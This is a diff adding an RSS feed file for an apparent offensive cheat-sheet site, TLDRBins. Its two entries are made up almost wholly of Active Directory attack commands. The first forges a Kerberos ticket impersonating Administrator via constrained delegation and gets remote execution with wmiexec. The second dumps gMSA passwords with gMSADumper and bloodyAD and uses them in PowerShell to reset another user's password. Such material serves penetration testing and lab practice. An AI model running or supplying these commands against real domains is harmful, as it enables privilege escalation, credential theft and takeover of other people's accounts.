@@ -1,0 +1,25 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>GMSADumper on TLDRBins</title>
+    <link>https://tldrbins.github.io/@gmsadumper/</link>
+    <description>Recent content in GMSADumper on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@gmsadumper/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>AllowedToDelegate</title>
+      <link>https://tldrbins.github.io/allowedtodelegate/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/allowedtodelegate/</guid>
+      <description>Privesc #1: Forge a Ticket (From Linux) # For example, spn: www/dc.example.com (Check Bloodhound) sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; impacket-getST -dc-ip &amp;lt;DC_IP&amp;gt; -spn www/dc.example.com -hashes :&amp;lt;HASH&amp;gt; -impersonate Administrator &amp;lt;DOMAIN&amp;gt;/&amp;lt;USER&amp;gt; # Export ccache export KRB5CCNAME=Administrator.ccache # Remote sudo ntpdate -s &amp;lt;DC&amp;gt; &amp;amp;&amp;amp; wmiexec.py -k -no-pass administrator@dc.example.com Note: impacket-wmiexec may not work</description>
+    </item>
+    <item>
+      <title>ReadGMSAPassword</title>
+      <link>https://tldrbins.github.io/readgmsapassword/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/readgmsapassword/</guid>
+      <description> Abuse #1: Read GMSAPassword (From Linux) gMSADumper gMSADumper&#xA;python3 gMSADumper.py -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; -l &amp;lt;TARGET&amp;gt; -d &amp;lt;DOMAIN&amp;gt; bloodAD bloodyAD&#xA;python3 bloodyAD.py -d &amp;lt;DOMAIN&amp;gt; -u &amp;lt;USER&amp;gt; -p &amp;lt;PASSWORD&amp;gt; --host &amp;lt;DC&amp;gt; get object &amp;lt;TARGET_OBJECT&amp;gt; --attr msDS-ManagedPassword Abuse #2: Save as Cred (From Windows) $gmsa = Get-ADServiceAccount -Identity &amp;lt;TARGET_NAME&amp;gt; -Properties &amp;#39;msDS-ManagedPassword&amp;#39; $mp = $gmsa.&amp;#39;msDS-ManagedPassword&amp;#39; $password = (ConvertFrom-ADManagedPasswordBlob $mp).CurrentPassword $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword $cred = New-Object System.Management.Automation.PSCredential &amp;lt;TARGET_NAME&amp;gt;, $SecPass # For example, change password of another target user Invoke-Command -ComputerName &amp;lt;COMPUTER_NAME&amp;gt; -ScriptBlock {Set-ADAccountPassword -Identity &amp;lt;ANOTHER_TARGET_NAME&amp;gt; -reset -NewPassword (ConvertTo-SecureString -AsPlainText &amp;#39;&amp;lt;PASSWORD&amp;gt;&amp;#39; -force)} -Credential $cred </description>
+    </item>
+  </channel>
+</rss>
